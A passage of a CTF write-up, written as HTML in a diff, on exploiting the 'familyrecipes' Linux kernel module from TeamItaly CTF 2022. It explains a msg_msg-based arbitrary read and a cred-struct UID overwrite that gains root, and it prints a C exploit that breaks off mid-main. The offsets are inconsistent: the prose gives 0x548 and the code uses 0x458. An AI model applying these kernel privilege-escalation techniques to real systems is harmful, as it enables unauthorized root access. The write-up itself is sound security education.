+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;[CHALL] [ERR] (Re)allocation failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	manager.num_of_recipes<span style="color:#f92672">--</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">goto</span> error;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<p>First of all, we need to leak some cache addresses.
+The plan is to allocate an <code>msg_msg</code> struct of 2048 bytes over the <code>recipes_list</code>, with the contents of <code>msg_msg</code> we can tamper with the list of pointers. If you want to know more about <code>msg_msg</code> read my previous article: <a href="https://leo1.cc/posts/docs/msg_msg">https://leo1.cc/posts/docs/msg_msg</a>.</p>
+<h3 id="arbitrary-read">Arbitrary read<a hidden class="anchor" aria-hidden="true" href="#arbitrary-read">#</a></h3>
+<p>Tampering with the <code>recipes_list</code> means writing arbitrary pointer into it, enabling us to arbitrary read memory.
+The <code>read_recipe</code> functionality of the module is not the best way to achieve the primitive we are looking for, since the check of the <code>owner_id</code> is quite limiting.</p>
+<p>However, the <code>get_info</code> comes to our rescue: this functionality is not restricted by the <code>owner_uid</code> check, thus we can read arbitrary locations through <code>recipe.bufsize</code>, <code>recipe.public</code> and <code>recipe.owner_id</code>. For the sake of simplicity I&rsquo;ll stick to the first one, as it enables us read a full qword.</p>
+<p>I wrote this function to simplify the process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ulong <span style="color:#a6e22e">read_qword</span>(ulong addr){
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// alloc msg_msg over recipes_list
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> msgbuf
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">long</span> mtype;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> mtext[<span style="color:#ae81ff">2000</span>];
+</span></span><span style="display:flex;"><span>    } msg;
+</span></span><span style="display:flex;"><span>    msg.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// place a pointer just after msg_msg metadata (index 6 of recipes_list)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ulong <span style="color:#f92672">*</span>ptr <span style="color:#f92672">=</span> (ulong <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg.mtext;
+</span></span><span style="display:flex;"><span>    ptr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>; <span style="color:#75715e">// recipe.bufsize overlaps the qword to read
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> qid <span style="color:#f92672">=</span> <span style="color:#a6e22e">alloc_msg</span>(<span style="color:#f92672">&amp;</span>msg, <span style="color:#66d9ef">sizeof</span>(msg.mtext));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">free_msg</span>(qid, <span style="color:#f92672">&amp;</span>msg, <span style="color:#66d9ef">sizeof</span>(msg.mtext));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// get the bufsize
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> info leak;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">info_recipe</span>(<span style="color:#ae81ff">6</span>, <span style="color:#f92672">&amp;</span>leak);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> leak.bufsize;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="achieve-rce">Achieve RCE<a hidden class="anchor" aria-hidden="true" href="#achieve-rce">#</a></h3>
+<h4 id="first-idea-tty_struct">First idea: tty_struct<a hidden class="anchor" aria-hidden="true" href="#first-idea-tty_struct">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> tty_struct {
+</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">int</span> magic; <span style="color:#75715e">// paranoia check
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#66d9ef">struct</span> kref kref; <span style="color:#75715e">// reference count
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#66d9ef">struct</span> device <span style="color:#f92672">*</span>dev;
+</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">struct</span> tty_driver <span style="color:#f92672">*</span>driver; <span style="color:#75715e">// must be valid
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> tty_operations <span style="color:#f92672">*</span>ops; <span style="color:#75715e">// ptr to vtable
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	  ...
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>To pull this off I needed first to leak the kmalloc-2k cache (the one where the <code>recipes_list</code> resides). To do that I leveraged some pointers in the metadata of <code>msg_msg struct</code>.
+<img alt="leak cache" loading="lazy" src="/posts/writeups/teamitalyctf22-familyrecipes/leak-cache.png">
+Once leaked <code>kmalloc-2k</code> I could basically leak every cache up to <code>kmalloc-1k</code>, using my arbitrary read primitive and the capability of allocating arbitrary chunks of size 8 to 1024 bytes (buffer chunks).</p>
+<p>The plan then was the following:</p>
+<ol>
+<li>forge a fake recipe (place as buf a pointer to <code>tty_struct</code>)</li>
+<li>free the fake recipe (UAF on tty_struct)</li>
+<li>allocate a recipe with bufsize of 1024 (override <code>tty_struct</code>)
+<ul>
+<li>to pass paranoia check <code>tty_struct.magic</code> should be <code>0x5401</code></li>
+<li>override <code>tty_struct.ops</code> with a pointer to a fake vtable of size <code>0x120</code></li>
+</ul>
+</li>
+<li>use <a href="https://github.com/smallkirby/kernelpwn/blob/master/technique/tty_struct.md#aaw-simplified-version-of-rip-control">this gadget</a> to achieve arbitrary write and override <code>modprobe_path</code></li>
+</ol>
+<p>As you may know, to allocate a <code>tty_struct</code> you need to open <code>/dev/ptmx</code>, which triggers a call to <code>ptmx_open</code> which, in turn, is responsible of allocating our beloved <code>tty_struct</code>.
+The trouble is that an extra check is done before the allocation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>fsi <span style="color:#f92672">=</span> <span style="color:#a6e22e">devpts_acquire</span>(filp);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">IS_ERR</span>(fsi)) {
+</span></span><span style="display:flex;"><span>	retval <span style="color:#f92672">=</span> <span style="color:#a6e22e">PTR_ERR</span>(fsi);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">goto</span> out_free_file;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This tries to interact with <code>/dev/pts</code>.
+Unfortunately this device is not mounted in this challenge environment.
+Dead end :/</p>
+<h4 id="second-idea-uaf-a-pipe_buffer">Second idea: UAF a pipe_buffer<a hidden class="anchor" aria-hidden="true" href="#second-idea-uaf-a-pipe_buffer">#</a></h4>
+<p>As I recently read about an heap struct called <code>pipe_buffer</code> (reading <a href="https://www.interruptlabs.co.uk/articles/pipe-buffer">this article</a>) and <code>tty_struct</code> exploitation didn&rsquo;t work out as expected, I thought about trying to achieve arbitrary write through pipes.</p>
+<p>I didn&rsquo;t actually test this idea because I had another brainwave (next paragraph), however, sooner or later I will try to use this method and update the post.</p>
+<h4 id="third-idea-override-cred-struct">Third idea: override cred struct<a hidden class="anchor" aria-hidden="true" href="#third-idea-override-cred-struct">#</a></h4>
+<p>The challenge module contains the <code>toggle</code> command, which could be used to write zero integers at arbitrary memory locations.
+This comes with some serious constraints:</p>
+<ul>
+<li>before using this functionality we must be sure that the location we are toggling isn&rsquo;t already empty, otherwise we would write a one in it</li>
+<li><code>recipes.owner_uid</code> must be equal to our uid, meaning that the word right under the location we want to toggle must be set to 1000</li>
+</ul>
+<p>A feasible target for this constrained arbitrary write is the <code>cred struct</code> of our exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> cred{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">atomic_long_t</span> usage;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">kuid_t</span>		uid;		<span style="color:#75715e">/* real UID of the task */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">kgid_t</span>		gid;		<span style="color:#75715e">/* real GID of the task */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">kuid_t</span>		suid;		<span style="color:#75715e">/* saved UID of the task */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">kgid_t</span>		sgid;		<span style="color:#75715e">/* saved GID of the task */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">kuid_t</span>		euid;		<span style="color:#75715e">/* effective UID of the task */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">kgid_t</span>		egid;		<span style="color:#75715e">/* effective GID of the task */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">kuid_t</span>		fsuid;		<span style="color:#75715e">/* UID for VFS ops */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">kgid_t</span>		fsgid;		<span style="color:#75715e">/* GID for VFS ops */</span>
+</span></span><span style="display:flex;"><span>	...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><em>The complete cred struct definition can be found <a href="https://elixir.bootlin.com/linux/v5.10.220/source/include/linux/cred.h#L88">here</a></em></p>
+<p><code>kuid_t</code> is a struct containing an <code>unsigned int</code>, so we are talking about 4 bytes in memory.
+The idea is now to set some UIDs to 0, meaning root privileges for our exploit!</p>
+<p>One of the bigger issues I faced was finding a way to leak the address of the <strong>correct</strong> <code>cred struct</code>. (remember that I&rsquo;m still a noob at kpwn and kernel debugging)</p>
+<p>Every process has an associated <code>task_struct</code>, which contains loads of information, including a pointer to the credentials of such process.
+The structs are linked in a linked-list, starting from <code>init_task</code>, this represents the process with <code>pid</code> 1.
+<code>init_task</code> is located in the kernel data region and, as KASLR is disabled, we know precisely where that is.
+The other tasks, however, are dynamically allocated and so are the creds.</p>
+<p><strong>We need to traverse the linked list until we find the <code>task_struct</code> containing the pid of our exploit, retrieve the address of the <code>cred struct</code> and override some UIDs.</strong></p>
+<p>Now, the structure of a <code>task_struct</code> is available <a href="https://elixir.bootlin.com/linux/v6.1/source/include/linux/sched.h#L737">here</a>, but getting the correct offsets for useful fields is not a piece of cake.
+However, after some debugging and guessing I retrieved the following:</p>
+<ul>
+<li><code>task_struct.pid</code> at offset <strong>0x560</strong></li>
+<li><code>task_struct.tasks</code> (pointer to next <code>task_struct</code>) at offset <strong>0x548</strong></li>
+<li><code>task_struct.real_cred</code> (pointer to <code>cred struct</code>) at offset <strong>0x728</strong></li>
+</ul>
+<p>Now it&rsquo;s just a matter of <del>painless</del> scripting.</p>
+<h4 id="final-exploit">Final Exploit<a hidden class="anchor" aria-hidden="true" href="#final-exploit">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/msg.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/msg.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CHALLENGE_DRIVER &#34;/dev/chall&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_ALLOC 1337
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_DELETE 1338
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_READ 1339
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_INFO 1340
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_TOGGLE 1341
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> fd;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">union</span> request {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> alloc {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> buf;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bufsize;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> public;
+</span></span><span style="display:flex;"><span>	} alloc;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> delete {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>	} delete;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> read {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bufsize;
+</span></span><span style="display:flex;"><span>	} read;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> info {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bufsize;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> public;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">uid_t</span> owner_uid;
+</span></span><span style="display:flex;"><span>	} info;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> toggle {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>	} toggle;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">request_t</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ulong <span style="color:#a6e22e">alloc_recipe</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, ulong bufsize, uint public){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">request_t</span> request;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    request.alloc.buf <span style="color:#f92672">=</span> buf;
+</span></span><span style="display:flex;"><span>    request.alloc.bufsize <span style="color:#f92672">=</span> bufsize;
+</span></span><span style="display:flex;"><span>    request.alloc.public <span style="color:#f92672">=</span> public;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, CMD_ALLOC, <span style="color:#f92672">&amp;</span>request);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> request.alloc.idx;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_recipe</span>(ulong idx, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, ulong bufsize){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">request_t</span> request;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    request.read.idx <span style="color:#f92672">=</span> idx;
+</span></span><span style="display:flex;"><span>    request.read.buf <span style="color:#f92672">=</span> buf;
+</span></span><span style="display:flex;"><span>    request.read.bufsize <span style="color:#f92672">=</span> bufsize;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, CMD_READ, <span style="color:#f92672">&amp;</span>request);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">delete_recipe</span>(ulong idx){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">request_t</span> request;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    request.delete.idx <span style="color:#f92672">=</span> idx;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, CMD_DELETE, <span style="color:#f92672">&amp;</span>request);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">info_recipe</span>(ulong idx, <span style="color:#66d9ef">struct</span> info<span style="color:#f92672">*</span> info){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">request_t</span> request;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	request.info.idx <span style="color:#f92672">=</span> idx;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, CMD_INFO, <span style="color:#f92672">&amp;</span>request);
+</span></span><span style="display:flex;"><span>	info<span style="color:#f92672">-&gt;</span>bufsize <span style="color:#f92672">=</span> request.info.bufsize;
+</span></span><span style="display:flex;"><span>	info<span style="color:#f92672">-&gt;</span>owner_uid <span style="color:#f92672">=</span> request.info.owner_uid;
+</span></span><span style="display:flex;"><span>	info<span style="color:#f92672">-&gt;</span>public <span style="color:#f92672">=</span> request.info.public;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">toggle_recipe</span>(ulong idx){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">request_t</span> request;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	request.toggle.idx <span style="color:#f92672">=</span> idx;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, CMD_TOGGLE, <span style="color:#f92672">&amp;</span>request);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">alloc_msg</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> data, <span style="color:#66d9ef">size_t</span> size){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> qid;
+</span></span><span style="display:flex;"><span>    qid <span style="color:#f92672">=</span> <span style="color:#a6e22e">msgget</span>(IPC_PRIVATE, <span style="color:#ae81ff">0666</span> <span style="color:#f92672">|</span> IPC_CREAT);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">msgsnd</span>(qid, data, size<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> qid;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">free_msg</span>(<span style="color:#66d9ef">int</span> qid, <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> buf, <span style="color:#66d9ef">size_t</span> size){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">msgrcv</span>(qid, buf, size, <span style="color:#ae81ff">0</span>, IPC_NOWAIT <span style="color:#f92672">|</span> MSG_NOERROR);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">leak</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> what, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> where){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s @ %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, what, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>) where);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ulong <span style="color:#a6e22e">read_qword</span>(ulong addr){
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// alloc msg_msg over recipes_list
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> msgbuf
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">long</span> mtype;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> mtext[<span style="color:#ae81ff">2000</span>];
+</span></span><span style="display:flex;"><span>    } msg;
+</span></span><span style="display:flex;"><span>    msg.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// place a pointer just after msg_msg metadata (index 6 of recipes_list)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ulong <span style="color:#f92672">*</span>ptr <span style="color:#f92672">=</span> (ulong <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg.mtext;
+</span></span><span style="display:flex;"><span>    ptr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>; <span style="color:#75715e">// recipe.bufsize overlaps the qword to read
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> qid <span style="color:#f92672">=</span> <span style="color:#a6e22e">alloc_msg</span>(<span style="color:#f92672">&amp;</span>msg, <span style="color:#66d9ef">sizeof</span>(msg.mtext));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">free_msg</span>(qid, <span style="color:#f92672">&amp;</span>msg, <span style="color:#66d9ef">sizeof</span>(msg.mtext));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// get the bufsize
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> info leak;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">info_recipe</span>(<span style="color:#ae81ff">6</span>, <span style="color:#f92672">&amp;</span>leak);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> leak.bufsize;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">change_uid</span>(ulong addr){
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// alloc msg_msg over recipes_list
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> msgbuf
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">long</span> mtype;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> mtext[<span style="color:#ae81ff">2000</span>];
+</span></span><span style="display:flex;"><span>    } msg;
+</span></span><span style="display:flex;"><span>    msg.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// place a pointer just after msg_msg metadata (index 6 of recipes_list)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ulong <span style="color:#f92672">*</span>ptr <span style="color:#f92672">=</span> (ulong <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg.mtext;
+</span></span><span style="display:flex;"><span>    ptr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>; <span style="color:#75715e">// recipe.public overlaps the uid we want to change
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> qid <span style="color:#f92672">=</span> <span style="color:#a6e22e">alloc_msg</span>(<span style="color:#f92672">&amp;</span>msg, <span style="color:#66d9ef">sizeof</span>(msg.mtext));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">free_msg</span>(qid, <span style="color:#f92672">&amp;</span>msg, <span style="color:#66d9ef">sizeof</span>(msg.mtext));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">toggle_recipe</span>(<span style="color:#ae81ff">6</span>); <span style="color:#75715e">// toggle uid (from 1000 to 0)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define INIT_TASK 0xffffffff828149c0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define NEXT_TASK_OFF 0x458
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PID_OFF 0x560
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CREDS_OFF 0x728
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(CHALLENGE_DRIVER, O_RDWR <span style="color:#f92672">|</span> O_NONBLOCK);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ulong bufsize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x300</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(bufsize);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// make manger.num_of_recipes = 0xff
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0xff</span>; i<span style="color:#f92672">++</span>){ 
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">alloc_recipe</span>(buf, bufsize, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// overflow manager.num_of_recipes back to 0
